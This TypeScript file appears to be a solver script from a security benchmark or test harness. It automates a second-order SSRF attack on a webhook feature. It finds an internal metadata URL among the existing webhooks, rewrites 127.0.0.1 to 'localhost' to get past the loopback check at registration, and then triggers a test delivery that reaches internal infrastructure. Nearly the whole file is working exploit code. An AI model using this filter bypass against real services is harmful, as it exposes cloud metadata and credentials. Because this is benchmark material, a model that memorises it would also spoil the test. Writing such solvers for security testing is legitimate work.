// Second-order SSRF: discover the loopback metrics-relay origin from the webhook targets, register a
// new webhook pointing at it (using the localhost alias to slip past the registration-time loopback
// literal check), then fire the test delivery so the stored target reaches internal infrastructure.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface WebhookItem { url?: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const listRes = await ctx.fetch(ctx.plan.routes.webhookList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: WebhookItem[] }
  const internal = list.items?.find((w) => /127\.0\.0\.1:\d+\/latest\/meta-data/.test(String(w.url)))?.url
  if (!internal) return
  const target = internal.replace('127.0.0.1', 'localhost')

  const urlField = ctx.plan.params.webhookUrl ?? 'url'
  const createBody: Record<string, string> = {}
  createBody[urlField] = target
  const createRes = await ctx.fetch(ctx.plan.routes.webhookCreate!.path, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(createBody),
  })
  const created = (await createRes.json()) as { id?: string }
  if (!created.id) return

  const testPath = ctx.plan.routes.webhookTest!.path.replace(/:[A-Za-z0-9_]+/, created.id)
  await ctx.fetch(testPath, { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' })
}
